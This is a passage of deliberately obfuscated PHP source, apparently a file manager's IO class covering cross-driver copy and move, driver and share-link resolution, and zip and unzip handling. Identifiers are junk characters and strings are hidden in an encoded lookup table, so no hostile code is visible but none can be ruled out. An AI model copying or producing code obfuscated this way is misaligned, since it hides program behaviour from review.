$·Áò‚ != $î–¤Êö¿) { $”ú»ØÜ¬ = !1; } if ($½ö¤Š && !$”ú»ØÜ¬) { $†ô‡“ ‹->_data[$ÅÈªú¬ä[1178]] = !0; } } if ($ºÉÑ…áÃ) { return self::copyFile($Üˆµ°ì¼, $«€›½­›, $†ô‡“ ‹, $›êí€øÛ, $î–¤Êö¿, $ŠİÕó‰¡); } if ($”ú»ØÜ¬ == REPEAT_RENAME_FOLDER) { $”ú»ØÜ¬ = !1; } $¿Áî = rtrim($›êí€øÛ, $ÅÈªú¬ä[8]) . $ÅÈªú¬ä[8] . $î–¤Êö¿; $««¦·Â¶ = $†ô‡“ ‹->mkdir($†ô‡“ ‹->getPath($¿Áî), $”ú»ØÜ¬); $›êí€øÛ = $†ô‡“ ‹->getPathInner($««¦·Â¶); $¤õ“ºâ˜ = $Üˆµ°ì¼->listPath($«€›½­›, !0); $¤õ“ºâ˜ = is_array($¤õ“ºâ˜) ? $¤õ“ºâ˜ : array($ÅÈªú¬ä[83] => array(), $ÅÈªú¬ä[82] => array()); $õİ¹ç‹¾ = array_merge($¤õ“ºâ˜[$ÅÈªú¬ä[83]], $¤õ“ºâ˜[$ÅÈªú¬ä[82]]); foreach ($õİ¹ç‹¾ as $İãšçæ) { $¦ÑÌëõÌ = $İãšçæ[$ÅÈªú¬ä[33]] == $ÅÈªú¬ä[199]; $«€›½­› = $Üˆµ°ì¼->getPathInner($İãšçæ[$ÅÈªú¬ä[84]]); $‰ï°¶Á¦ = self::copyPath($Üˆµ°ì¼, $«€›½­›, $†ô‡“ ‹, $›êí€øÛ, $”ú»ØÜ¬, $ŠİÕó‰¡, $¦ÑÌëõÌ, !1, !1); if (!$‰ï°¶Á¦) { IO::errorTips($ÅÈªú¬ä[1179] . $«€›½­› . $ÅÈªú¬ä[70] . $›êí€øÛ); } } self::copyMoveKeepInfo($Üˆµ°ì¼, $«€›½­›, $««¦·Â¶); return $««¦·Â¶; } private static function copyFile($“°ğÖÇ®, $Ÿ»íùÕ, $æğÄ‰ÌŒ, $÷Ø´ÑÖÅ, $¾‘²è®Ğ, $•ïˆìÊ„) { $˜Í©™Æ =& $_SERVER[³·—™¤¢]; $÷Ø´ÑÖÅ = $æğÄ‰ÌŒ->getPath(rtrim($÷Ø´ÑÖÅ, $˜Í©™Æ[8]) . $˜Í©™Æ[8] . $¾‘²è®Ğ); $ƒŠúû¼ş = $˜Í©™Æ[1180] . time() . rand_string(5); Hook::trigger($˜Í©™Æ[1181], $“°ğÖÇ®, $Ÿ»íùÕ, $æğÄ‰ÌŒ, $÷Ø´ÑÖÅ, $¾‘²è®Ğ, $ƒŠúû¼ş); if (self::driverIsSame($“°ğÖÇ®, $æğÄ‰ÌŒ)) { if ($•ïˆìÊ„) { $¢åˆ¼ò = $æğÄ‰ÌŒ->moveFile($Ÿ»íùÕ, $÷Ø´ÑÖÅ); } else { $¢åˆ¼ò = $æğÄ‰ÌŒ->copyFile($Ÿ»íùÕ, $÷Ø´ÑÖÅ); } Hook::trigger($˜Í©™Æ[1182], $“°ğÖÇ®, $Ÿ»íùÕ, $æğÄ‰ÌŒ, $÷Ø´ÑÖÅ, $¾‘²è®Ğ, $¢åˆ¼ò); self::copyMoveKeepInfo($“°ğÖÇ®, $Ÿ»íùÕ, $¢åˆ¼ò); return $¢åˆ¼ò; } $ŠŠçÚ…½ = TEMP_FILES; if ($GLOBALS[$˜Í©™Æ[6]][$˜Í©™Æ[89]][$˜Í©™Æ[816]]) { $ŠŠçÚ…½ = $GLOBALS[$˜Í©™Æ[6]][$˜Í©™Æ[89]][$˜Í©™Æ[816]]; } $Ö„ƒ†Œ¦ = $ŠŠçÚ…½; mk_dir($Ö„ƒ†Œ¦); $‹¿…Ø¢ = $Ö„ƒ†Œ¦ . $ƒŠúû¼ş; $ç‚µü = $‹¿…Ø¢; $‹¿…Ø¢ = $“°ğÖÇ®->download($Ÿ»íùÕ, $‹¿…Ø¢); $‹¿…Ø¢ = $“°ğÖÇ®->iconvApp($‹¿…Ø¢); if (substr($‹¿…Ø¢, strlen($ŠŠçÚ…½)) == $ŠŠçÚ…½) { $•ïˆìÊ„ = !0; } $¢åˆ¼ò = $æğÄ‰ÌŒ->upload($÷Ø´ÑÖÅ, $‹¿…Ø¢, $•ïˆìÊ„); self::remove($ç‚µü); Hook::trigger($˜Í©™Æ[1182], $“°ğÖÇ®, $Ÿ»íùÕ, $æğÄ‰ÌŒ, $÷Ø´ÑÖÅ, $¾‘²è®Ğ, $¢åˆ¼ò); self::copyMoveKeepInfo($“°ğÖÇ®, $Ÿ»íùÕ, $¢åˆ¼ò); return $¢åˆ¼ò; } private static function copyMoveKeepInfo($êËÆ®, $‘µ™”ıø, $œ¼Åâ†‡) { if (!$œ¼Åâ†‡) { return; } $“œß±Ğ´ = $êËÆ®->info($‘µ™”ıø); if (!is_array($“œß±Ğ´)) { return; } IO::setModifyTime($œ¼Åâ†‡, $“œß±Ğ´[$_SERVER[³·—™¤¢][85]]); } public static function pathFather($Å±Ø¾¾¥) { $ÜÌ¢é†Ó = IO::init($Å±Ø¾¾¥); $ˆ…€Œìà = $ÜÌ¢é†Ó->pathFather($ÜÌ¢é†Ó->path); return $ÜÌ¢é†Ó->getPathOuter($ˆ…€Œìà); } public static function fileOut($Õà¡‹ì, $”ÌÁ ¬İ = false, $×—§ïÈñ = false, $¾—®¹› = '') { $¶ª½üÖ¬ = self::driverMake($Õà¡‹ì); if ($¶ª½üÖ¬->isFileOutServer()) { return $¶ª½üÖ¬->fileOutServer($Õà¡‹ì, $”ÌÁ ¬İ, $×—§ïÈñ, $¾—®¹›); } return $¶ª½üÖ¬->fileOut($Õà¡‹ì, $”ÌÁ ¬İ, $×—§ïÈñ, $¾—®¹›); } public static function fileOutImage($÷³ ÌÂê, $¨¾Ò™„¢ = 250) { $·§â³³Ê = array(250, 600, 1200, 2000, 3000, 5000); for ($ÈÑËñŸ = 0; $ÈÑËñŸ < count($·§â³³Ê); $ÈÑËñŸ++) { if ($ÈÑËñŸ == 0 && $¨¾Ò™„¢ <= $·§â³³Ê[$ÈÑËñŸ]) { $¨¾Ò™„¢ = $·§â³³Ê[$ÈÑËñŸ]; break; } else { if ($¨¾Ò™„¢ > $·§â³³Ê[$ÈÑËñŸ - 1] && $¨¾Ò™„¢ <= $·§â³³Ê[$ÈÑËñŸ]) { $¨¾Ò™„¢ = $·§â³³Ê[$ÈÑËñŸ]; break; } else { if ($ÈÑËñŸ == count($·§â³³Ê) - 1 && $¨¾Ò™„¢ > $·§â³³Ê[$ÈÑËñŸ]) { $¨¾Ò™„¢ = $·§â³³Ê[$ÈÑËñŸ]; break; } } } } $ºµ²¼ó« = self::driverMake($÷³ ÌÂê); if ($ºµ²¼ó«->isFileOutServer()) { return $ºµ²¼ó«->fileOutImageServer($÷³ ÌÂê, $¨¾Ò™„¢); } return $ºµ²¼ó«->fileOutImage($÷³ ÌÂê, $¨¾Ò™„¢); } private static function driverIsSame($–—ì¬°š, $ğè—çƒë) { $Ë®ÊÅº› =& $_SERVER[³·—™¤¢]; $·¢õ‰‚ = $–—ì¬°š->getType(); $Œ¬•¡‰® = $ğè—çƒë->getType(); if ($·¢õ‰‚ != $Œ¬•¡‰®) { return !1; } if ($·¢õ‰‚ == $Ë®ÊÅº›[778]) { return !0; } if ($·¢õ‰‚ == $Ë®ÊÅº›[106]) { return !0; } if ($–—ì¬°š->pathDriver == $ğè—çƒë->pathDriver) { return !0; } return !1; } public static function copyUpdate($·¥ƒôƒ, $ğÌğıà ) { $Ü­Âº‡é =& $_SERVER[³·—™¤¢]; if (!IO::exist($·¥ƒôƒ)) { return !1; } if (!IO::exist($ğÌğıà )) { IO::mkdir($ğÌğıà ); } $Ö÷Ô”² = self::_listAll($·¥ƒôƒ); $·’¦ˆÖè = self::_listAll($ğÌğıà ); $ÓÊ’¦á® = array(); $ñ°‡Ïı = array(); foreach ($Ö÷Ô”² as $«¶¢í·Õ => $âí‡Ğ×¥) { if (isset($·’¦ˆÖè[$«¶¢í·Õ])) { if ($âí‡Ğ×¥[$Ü­Âº‡é[75]] == 1) { continue; } if ($·’¦ˆÖè[$«¶¢í·Õ][$Ü­Âº‡é[76]] == $âí‡Ğ×¥[$Ü­Âº‡é[76]]) { continue; } } if ($âí‡Ğ×¥[$Ü­Âº‡é[75]] == 1) { $ñ°‡Ïı[] = $ğÌğıà  . $Ü­Âº‡é[8] . $«¶¢í·Õ; continue; } $Õ ĞøÙ© = strstr(trim($«¶¢í·Õ, $Ü­Âº‡é[8]), $Ü­Âº‡é[8]) ? get_path_father($«¶¢í·Õ) : $Ü­Âº‡é[12]; $ÓÊ’¦á®[] = array($Ü­Âº‡é[1183] => $âí‡Ğ×¥[$Ü­Âº‡é[84]], $Ü­Âº‡é[1184] => rtrim($ğÌğıà , $Ü­Âº‡é[8]) . $Ü­Âº‡é[8] . $Õ ĞøÙ©, $Ü­Âº‡é[1185] => $âí‡Ğ×¥); } $ı’üö“æ = array($Ü­Âº‡é[199] => $ÓÊ’¦á®, $Ü­Âº‡é[75] => $ñ°‡Ïı); Hook::trigger($Ü­Âº‡é[1186], $·¥ƒôƒ, $ğÌğıà , $ı’üö“æ); foreach ($ñ°‡Ïı as $âí‡Ğ×¥) { IO::mkdir($âí‡Ğ×¥); } foreach ($ÓÊ’¦á® as $âí‡Ğ×¥) { IO::copy($âí‡Ğ×¥[$Ü­Âº‡é[1183]], $âí‡Ğ×¥[$Ü­Âº‡é[1184]], REPEAT_REPLACE); } } private static function _listAll($„½«±ƒï) { $şÒ˜ÎÎÔ =& $_SERVER[³·—™¤¢]; $„½«±ƒï = KodIO::clear($„½«±ƒï); $ßÅ·„û = IO::listAll($„½«±ƒï); foreach ($ßÅ·„û as &$©ğœî­–) { $®Ë†Ò” = substr($©ğœî­–[$şÒ˜ÎÎÔ[84]], strlen($„½«±ƒï)); $©ğœî­–[$şÒ˜ÎÎÔ[1187]] = trim($®Ë†Ò”, $şÒ˜ÎÎÔ[8]); } unset($©ğœî­–); return array_to_keyvalue($ßÅ·„û, $şÒ˜ÎÎÔ[1187]); } public static function fileSubstr($¬Œ±ƒº, $Õ×ˆ¡ˆ, $Ÿê„†ÌÆ = false) { $òä·Ö’« =& $_SERVER[³·—™¤¢]; $œ—ä³¡ = self::driverMake($¬Œ±ƒº); $ªÙ÷ªõÃ = $œ—ä³¡->size($¬Œ±ƒº); $ãØˆı¯“ = $Õ×ˆ¡ˆ; $†œé¢Àğ = $Ÿê„†ÌÆ; if ($Õ×ˆ¡ˆ < 0) { $Õ×ˆ¡ˆ = $ªÙ÷ªõÃ + $Õ×ˆ¡ˆ; } if ($Ÿê„†ÌÆ === !1) { $Ÿê„†ÌÆ = $ªÙ÷ªõÃ - $Õ×ˆ¡ˆ; } if ($Õ×ˆ¡ˆ + $Ÿê„†ÌÆ > $ªÙ÷ªõÃ) { $Ÿê„†ÌÆ = $ªÙ÷ªõÃ - $Õ×ˆ¡ˆ; } if (!$ªÙ÷ªõÃ && $œ—ä³¡->getType() == $òä·Ö’«[106] && !$œ—ä³¡->exist($¬Œ±ƒº)) { $†øİî¢ø = get_path_this($¬Œ±ƒº); $‚¢ğ¬”ö = parse_url_query($†øİî¢ø); if (is_array($‚¢ğ¬”ö) && isset($‚¢ğ¬”ö[$òä·Ö’«[32]])) { $†øİî¢ø = urldecode($‚¢ğ¬”ö[$òä·Ö’«[32]]); } throw new Exception($òä·Ö’«[1188] . LNG($òä·Ö’«[1189]) . $òä·Ö’«[989] . clear_html($†øİî¢ø) . $òä·Ö’«[12]); } if ($Ÿê„†ÌÆ <= 0) { return $òä·Ö’«[12]; } if ($Õ×ˆ¡ˆ < 0 || $Õ×ˆ¡ˆ >= $ªÙ÷ªõÃ || $Ÿê„†ÌÆ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\122\x65\x61\144\40\145\x72\x72\157\x72\41\40\163\164\x61\162\x74\x3d{$Õ×ˆ¡ˆ}\x3b\154\x65\156\147\x74\150\x3d{$Ÿê„†ÌÆ}\73\40\163\151\172\x65\75{$ªÙ÷ªõÃ}\x3b"); } $çœ°¢›¢ = $œ—ä³¡->fileSubstr($¬Œ±ƒº, $Õ×ˆ¡ˆ, $Ÿê„†ÌÆ); if (!$çœ°¢›¢ && $Ÿê„†ÌÆ && isset($GLOBALS[$òä·Ö’«[1190]])) { throw new Exception($GLOBALS[$òä·Ö’«[1190]][$òä·Ö’«[1191]]); } return $çœ°¢›¢; } private static function driverMake(&$¶ÓşÔ”) { $âÑ´ƒ² =& $_SERVER[³·—™¤¢]; $šÇ¸æâ = KodIO::parse($¶ÓşÔ”); if (!self::$driverListSystem) { $¨¹¹°¾ = Model($âÑ´ƒ²[787])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¨¹¹°¾, $âÑ´ƒ²[399]); } if ($šÇ¸æâ[$âÑ´ƒ²[33]] == KodIO::KOD_IO && !self::$driverListSystem[$šÇ¸æâ[$âÑ´ƒ²[399]]]) { return !1; } $¶ÓşÔ” = $šÇ¸æâ[$âÑ´ƒ²[1192]]; $ó¥ƒÖ© = self::driverGet($šÇ¸æâ, $¶ÓşÔ”); return $ó¥ƒÖ©; } private static function driverGet($íÏç©Ë­, &$‹˜›¢ò¤) { $óãˆ¿ =& $_SERVER[³·—™¤¢]; $««¶©Å = $íÏç©Ë­[$óãˆ¿[1193]]; $•Ü©ğ— = $íÏç©Ë­[$óãˆ¿[399]]; switch ($íÏç©Ë­[$óãˆ¿[33]]) { case KodIO::KOD_IO: $½¥‰Ù« = self::$driverListSystem[$•Ü©ğ—]; break; case KodIO::KOD_SOURCE: $‹˜›¢ò¤ = $•Ü©ğ— . $‹˜›¢ò¤; $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1195], $óãˆ¿[6] => $íÏç©Ë­); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÌìéÒö = $GLOBALS[$óãˆ¿[1196]]; self::$driverListUser = array_to_keyvalue($ÌìéÒö, $óãˆ¿[399]); } $½¥‰Ù« = self::$driverListUser[$•Ü©ğ—]; break; case KodIO::KOD_SHARE_LINK: $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1197], $óãˆ¿[6] => $íÏç©Ë­); $÷ÄÍ¹³Ü = Action($óãˆ¿[1198])->sharePathInfo($íÏç©Ë­[$óãˆ¿[84]]); $‹˜›¢ò¤ = $÷ÄÍ¹³Ü[$óãˆ¿[402]]; if (!$÷ÄÍ¹³Ü[$óãˆ¿[402]]) { $–ÁšäÈ† = Model($óãˆ¿[601])->getInfo($÷ÄÍ¹³Ü[$óãˆ¿[489]]); $‹˜›¢ò¤ = KodIO::clear($–ÁšäÈ†[$óãˆ¿[1199]] . $íÏç©Ë­[$óãˆ¿[1192]]); $íÏç©Ë­[$óãˆ¿[487]] = $–ÁšäÈ†; $íÏç©Ë­[$óãˆ¿[1174]] = $‹˜›¢ò¤; $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1200], $óãˆ¿[6] => $íÏç©Ë­); } break; case KodIO::KOD_SHARE_ITEM: $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1201], $óãˆ¿[6] => $íÏç©Ë­); $–ÁšäÈ† = Model($óãˆ¿[601])->getInfo($íÏç©Ë­[$óãˆ¿[399]]); if ($–ÁšäÈ†[$óãˆ¿[402]] == $óãˆ¿[197]) { $‹˜›¢ò¤ = KodIO::clear($–ÁšäÈ†[$óãˆ¿[1199]] . $íÏç©Ë­[$óãˆ¿[1192]]); $íÏç©Ë­[$óãˆ¿[487]] = $–ÁšäÈ†; $íÏç©Ë­[$óãˆ¿[1174]] = $‹˜›¢ò¤; $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1202], $óãˆ¿[6] => $íÏç©Ë­); } else { if (!$‹˜›¢ò¤) { $‹˜›¢ò¤ = $–ÁšäÈ†[$óãˆ¿[402]]; } } break; default: $‹˜›¢ò¤ = $íÏç©Ë­[$óãˆ¿[84]]; $½¥‰Ù« = array($óãˆ¿[1194] => $óãˆ¿[1203]); break; } $ÒÁÚæí¶ = $íÏç©Ë­[$óãˆ¿[84]]; if (!isset(self::$driverCache[$ÒÁÚæí¶])) { $÷Ÿ¡åĞ = strtolower($½¥‰Ù«[$óãˆ¿[95]]); $„¶£ò…• = $GLOBALS[$óãˆ¿[6]][$óãˆ¿[89]][$óãˆ¿[846]]; $‘ŠÚÒ’Ş = $óãˆ¿[74] . (isset($„¶£ò…•[$÷Ÿ¡åĞ]) ? $„¶£ò…•[$÷Ÿ¡åĞ] : ucfirst($÷Ÿ¡åĞ)); if (!class_exists($‘ŠÚÒ’Ş)) { show_json("{$‘ŠÚÒ’Ş}\x20\x6e\157\164\x20\145\170\x69\163\x74\x73\41", !1); } $ê¹Ó€­® = isset($½¥‰Ù«[$óãˆ¿[6]]) ? $½¥‰Ù«[$óãˆ¿[6]] : !1; self::$driverCache[$ÒÁÚæí¶] = new $‘ŠÚÒ’Ş($ê¹Ó€­®); } $»§¹–Íà = self::$driverCache[$ÒÁÚæí¶]; $»§¹–Íà->pathDriver = $««¶©Å; $»§¹–Íà->pathBase = $óãˆ¿[12]; if (isset($½¥‰Ù«[$óãˆ¿[6]][$óãˆ¿[1204]])) { $»§¹–Íà->pathBase = rtrim($½¥‰Ù«[$óãˆ¿[6]][$óãˆ¿[1204]], $óãˆ¿[8]) . $óãˆ¿[8]; $‹˜›¢ò¤ = $»§¹–Íà->pathBase . ltrim($‹˜›¢ò¤, $óãˆ¿[8]); } $‹˜›¢ò¤ = $»§¹–Íà->getPath($‹˜›¢ò¤); if (isset($íÏç©Ë­[$óãˆ¿[1174]])) { $‹˜›¢ò¤ = $íÏç©Ë­[$óãˆ¿[1174]]; } $»§¹–Íà->path = $‹˜›¢ò¤; return $»§¹–Íà; } public static function errorTips($°¡ÇÈ­¿ = false) { $â˜Ù¹Ó„ =& $_SERVER[³·—™¤¢]; static $û÷òåï€ = array(); $’ÒÛ°Ã = 1000; if ($°¡ÇÈ­¿ === -1) { return $û÷òåï€ ? $û÷òåï€[count($û÷òåï€) - 1] : $â˜Ù¹Ó„[12]; } if ($°¡ÇÈ­¿ === !1) { return implode($â˜Ù¹Ó„[231], $û÷òåï€); } if (count($û÷òåï€) >= $’ÒÛ°Ã) { $û÷òåï€ = array_slice($û÷òåï€, $’ÒÛ°Ã * 0.5, $’ÒÛ°Ã); } $û÷òåï€[] = $°¡ÇÈ­¿; write_log($â˜Ù¹Ó„[162] . ACTION . $â˜Ù¹Ó„[1205] . $°¡ÇÈ­¿, $â˜Ù¹Ó„[1206]); } public static function getLastError($³¥ÜœñÅ = '') { $™ó®õ¨ = self::errorTips(-1); return $™ó®õ¨ ? $™ó®õ¨ : $³¥ÜœñÅ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÛÆŒÈ‹ı; if (!$ÛÆŒÈ‹ı) { $ãğÉñÀ® = IO::init($_SERVER[³·—™¤¢][8]); } return $ãğÉñÀ®; } private static function iconvSystem($üåÀÔº¹) { return self::local()->iconvSystem($üåÀÔº¹); } private static function iconvApp($ ¢ªô´¹) { return self::local()->iconvApp($ ¢ªô´¹); } public static function zip($áÁá°ìÌ, $ô“×Ö¨ˆ = "\x7a\151\x70", $ÁÅŸÂÇ = '', $Æ¥ş”ñæ = REPEAT_RENAME) { $Ì•êÂœ =& $_SERVER[³·—™¤¢]; $É½ÔŞŞ = self::init($áÁá°ìÌ[0][$Ì•êÂœ[84]]); $„é›ŠÙØ = self::info($áÁá°ìÌ[0][$Ì•êÂœ[84]]); $Å«Ùï— = !1; if (!$ÁÅŸÂÇ && $É½ÔŞŞ->getType() == $Ì•êÂœ[106]) { $ªÊüæ¹ª = self::zipFileList($áÁá°ìÌ); } else { $Å«Ùï— = $ÁÅŸÂÇ ? $ÁÅŸÂÇ : TEMP_FILES . $Ì•êÂœ[1207] . time() . rand_string(8) . $Ì•êÂœ[8]; mk_dir($Å«Ùï—); $ªÊüæ¹ª = self::zipFileList($áÁá°ìÌ, $Å«Ùï—); } $âÀÚåò = $„é›ŠÙØ[$Ì•êÂœ[32]]; if (count($ªÊüæ¹ª) > 1) { $ÎØÇ„ = IO::info(IO::pathFather($„é›ŠÙØ[$Ì•êÂœ[84]])); $âÀÚåò = $ÎØÇ„[$Ì•êÂœ[32]]; } $•ğÏš¦¬ = $Å«Ùï—; if (!$•ğÏš¦¬) { $•ğÏš¦¬ = get_path_father($„é›ŠÙØ[$Ì•êÂœ[84]]); if (!$ÁÅŸÂÇ && $É½ÔŞŞ->getType() == $Ì•êÂœ[106]) { $•ğÏš¦¬ = get_path_father($É½ÔŞŞ->path); } $õ¨¸œĞª = IO::info($•ğÏš¦¬); if (!$õ¨¸œĞª[$Ì•êÂœ[202]]) { show_json(LNG($Ì•êÂœ[1208]), !1); } } $úÜä©ù = $•ğÏš¦¬ . $âÀÚåò . $Ì•êÂœ[10] . $ô“×Ö¨ˆ; $úÜä©ù = get_filename_auto($úÜä©ù, $Ì•êÂœ[12], $Æ¥ş”ñæ); $§‰÷æñø = self::iconvSystem($úÜä©ù); foreach ($ªÊüæ¹ª as $§Õ§ô³ => $«Å­ÑËî) { $ªÊüæ¹ª[$§Õ§ô³] = self::iconvSystem($«Å­ÑËî); } KodArchive::create($§‰÷æñø, $ªÊüæ¹ª); if (!IO::exist($úÜä©ù)) { if ($Å«Ùï—) { del_dir($Å«Ùï—); } show_json(LNG($Ì•êÂœ[1209]), !1); } if ($ÁÅŸÂÇ || !$Å«Ùï—) { if ($Å«Ùï— && strstr($Å«Ùï—, TEMP_FILES)) { $½Ğ»¬š = $ªÊüæ¹ª = array(); recursion_dir($•ğÏš¦¬, $½Ğ»¬š, $ªÊüæ¹ª, 0); foreach ($½Ğ»¬š as $ì®º‰¢¼) { del_dir($ì®º‰¢¼); } foreach ($ªÊüæ¹ª as $ü–Ø÷Õš) { if ($ü–Ø÷Õš == $§‰÷æñø) { continue; } del_file($ü–Ø÷Õš); } } return $úÜä©ù; } $‡½½Ìê¿ = self::pathFather($„é›ŠÙØ[$Ì•êÂœ[84]]); $÷õ™È§ù = self::move($úÜä©ù, $‡½½Ìê¿, $Æ¥ş”ñæ); if (!$÷õ™È§ù) { del_dir($Å«Ùï—); show_json(LNG($Ì•êÂœ[1209]), !1); } del_dir($Å«Ùï—); return $÷õ™È§ù; } public static function unzip($Ä…ÁŒ«½, $Ûö¥õÄ = "\162\145\x70\x6c\141\x63\145") { $Ñë•Ê†ò =& $_SERVER[³·—™¤¢]; $Åš™ºó„ = $Ä…ÁŒ«½[$Ñë•Ê†ò[84]]; $û€²ÃØ— = $Ä…ÁŒ«½[$Ñë•Ê†ò[1210]]; if (!($àäÁË‚ª = parent::info($Åš™ºó„))) { show_json(LNG($Ñë•Ê†ò[1211]), !1); } if (!($­í³ö¡š = parent::infoFull($û€²ÃØ—))) { $û€²ÃØ— = parent::mkdir($û€²ÃØ—); $­í³ö¡š = array($Ñë•Ê†ò[84] => $û€²ÃØ—); } else { if (isset($­í³ö¡š[$Ñë•Ê†ò[402]]) && trim($­í³ö¡š[$Ñë•Ê†ò[84]], $Ñë•Ê†ò[8]) != trim($û€²ÃØ—, $Ñë•Ê†ò[8])) { $ìİ¼íÚú = KodIO::make($­í³ö¡š[$Ñë•Ê†ò[432]]); $”î¯óÓ– = parent::fileNameAuto($ìİ¼íÚú, $­í³ö¡š[$Ñë•Ê†ò[32]], REPEAT_RENAME_FOLDER, !0); $û€²ÃØ— = parent::mkdir($ìİ¼íÚú . $”î¯óÓ–); $­í³ö¡š = array($Ñë•Ê†ò[84] => $û€²ÃØ—); } } $û€²ÃØ— = $­í³ö¡š[$Ñë•Ê†ò[84]]; $ÈÕºìÑ = self::tmpFileName($àäÁË‚ª); $»Ÿ®¤€ = TEMP_FILES . $ÈÕºìÑ; del_dir($»Ÿ®¤€); mk_dir($»Ÿ®¤€); $‰äèä = self::fileExt($àäÁË‚ª); $§Õ’š‹š = $»Ÿ®¤€ . $Ñë•Ê†ò[10] . $‰äèä; if (!@file_exists(self::iconvSystem($§Õ’š‹š))) { $ù–õêêÏ = self::localFilePath($Åš™ºó„, $‰äèä); $§Õ’š‹š = $ù–õêêÏ ? $ù–õêêÏ : parent::download($Åš™ºó„, $§Õ’š‹š); } $§Õ’š‹š = self::iconvSystem($§Õ’š‹š); $ÄÄı…©õ = isset($Ä…ÁŒ«½[$Ñë•Ê†ò[1212]]) ? $Ä…ÁŒ«½[$Ñë•Ê†ò[1212]] : $Ñë•Ê†ò[1213]; $‹¾ìƒß = KodArchive::extract($§Õ’š‹š, $»Ÿ®¤€ . $Ñë•Ê†ò[8], $ÄÄı…©õ); self::archiveExt(); if (!$‹¾ìƒß[$Ñë•Ê†ò[1214]]) { show_json($Ñë•Ê†ò[1215] . $‹¾ìƒß[$Ñë•Ê†ò[1216]], !1); } Hook::trigger($Ñë•Ê†ò[1217], $»Ÿ®¤€); recursion_dir($»Ÿ®¤€, $ ¾¢àŒ„, $ÆŠÚÉö, 0); $ë¦èäœ = array_merge($ ¾¢àŒ„, $ÆŠÚÉö); foreach ($ë¦èäœ as $şµğ¼á¬) { $şµğ¼á¬ = self::iconvApp($şµğ¼á¬); self::move($şµğ¼á¬, $û€²ÃØ—, $Ûö¥õÄ); } del_dir($»Ÿ®¤€); if (!$ù–õêêÏ) { del_file($§Õ’š‹š); } return !0; } public static function unzipList($—Ö¨ôïä) { $½Ìƒ…£ú =& $_SERVER[³·—™¤¢]; $“Ô×¯¸ = $—Ö¨ôïä[$½Ìƒ…£ú[84]]; $˜ºú—¢¬ = isset($—Ö¨ôïä[$½Ìƒ…£ú[1218]]) ? $—Ö¨ôïä[$½Ìƒ…£ú[1218]] : -1; $ò§Ê› = 50000; if (request_url_safe($“Ô×¯¸)) { $›¡àÄœ = parse_url_query($“Ô×¯¸); if (!isset($›¡àÄœ[$½Ìƒ…£ú[84]])) { show_json($½Ìƒ…£ú[1219], !1); } } $ÈŞ—ƒùš = isset($›¡àÄœ) ? $›¡àÄœ[$½Ìƒ…£ú[84]] : $“Ô×¯¸; $Û¸±”³ı = self::info($ÈŞ—ƒùš); $¢›­œù© = self::fileExt($Û¸±”³ı); $ì¡õ¿İÀ = self::tmpFileName($Û¸±”³ı); if (isset($›¡àÄœ)) { $Ñš÷úßí = array($›¡àÄœ[$½Ìƒ…£ú[84]], $›¡àÄœ[$½Ìƒ…£ú[1218]], $›¡àÄœ[$½Ìƒ…£ú[32]]); $µß²•Ã = md5(implode($½Ìƒ…£ú[11], $Ñš÷úßí)) . $½Ìƒ…£ú[10] . get_path_ext($›¡àÄœ[$½Ìƒ…£ú[32]]); } else { $Ñš÷úßí = array($Û¸±”³ı[$½Ìƒ…£ú[32]], $Û¸±”³ı[$½Ìƒ…£ú[84]], $Û¸±”³ı[$½Ìƒ…£ú[76]]); $µß²•Ã = md5(implode($½Ìƒ…£ú[11], $Ñš÷úßí)) . $½Ìƒ…£ú[10] . $¢›­œù©; } if ($˜ºú—¢¬ == -1) { $ã´«ñèù = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\126\151\145\167\x2f{$ì¡õ¿İÀ}\57{$µß²•Ã}\x2e\x6c\157\147"; $¶õëåãŸ = self::infoFull($ã´«ñèù); if ($¶õëåãŸ) { $ã´«ñèù = $¶õëåãŸ[$½Ìƒ…£ú[84]]; $€œĞ×Íµ = self::getContent($ã´«ñèù); if ($€œĞ×Íµ) { $ğª˜Ÿ£– = json_decode($€œĞ×Íµ, !0); $ğª˜Ÿ£– = is_array($ğª˜Ÿ£–) ? $ğª˜Ÿ£– : array(); if (count($ğª˜Ÿ£–) >= $ò§Ê›) { show_json(sprintf(LNG($½Ìƒ…£ú[1220]), count($ğª˜Ÿ£–)), !1); } return $ğª˜Ÿ£–; } } else { $ã´«ñèù = self::mkfile($ã´«ñèù); } } $æ…ŞÀÛù = TEMP_FILES . $ì¡õ¿İÀ; if (!is_dir($æ…ŞÀÛù)) { mk_dir($æ…ŞÀÛù); } $¶¾ûÂÛ = $æ…ŞÀÛù . $½Ìƒ…£ú[8] . $µß²•Ã; if (!@file_exists(self::iconvSystem($¶¾ûÂÛ))) { if (isset($›¡àÄœ)) { url_request($“Ô×¯¸, $½Ìƒ…£ú[1221], $¶¾ûÂÛ); } else { $ŸÕÄŒ©” = self::localFilePath($“Ô×¯¸, $¢›­œù©); $¶¾ûÂÛ = $ŸÕÄŒ©” ? $ŸÕÄŒ©” : self::download($“Ô×¯¸, $¶¾ûÂÛ); } } $¶¾ûÂÛ = self::iconvSystem($¶¾ûÂÛ); if ($˜ºú—¢¬ >= 0) { $èÛŠË­˜ = isset($—Ö¨ôïä[$½Ìƒ…£ú[1222]]) ? $—Ö¨ôïä[$½Ìƒ…£ú[1222]] : !1; $şñ«¤¸š = isset($—Ö¨ôïä[$½Ìƒ…£ú[32]]) ? $—Ö¨ôïä[$½Ìƒ…£ú[32]] : $½Ìƒ…£ú[12]; KodArchive::filePreview($¶¾ûÂÛ, $˜ºú—¢¬, $èÛŠË­˜, $şñ«¤¸š); self::archiveExt(); die; } $…òğø™£ = KodArchive::listContent($¶¾ûÂÛ); self::archiveExt(); del_dir($æ…ŞÀÛù); if (!$…òğø™£[$½Ìƒ…£ú[1214]]) { show_json($…òğø™£[$½Ìƒ…£ú[1216]], !1); } $ğª˜Ÿ£– = json_encode($…òğø™£[$½Ìƒ…£ú[1216]]); self::setContent($ã´«ñèù, $ğª˜Ÿ£–); if (count($…òğø™£[$½Ìƒ…£ú[1216]]) >= $ò§Ê›) { show_json(sprintf(LNG($½Ìƒ…£ú[1220]), 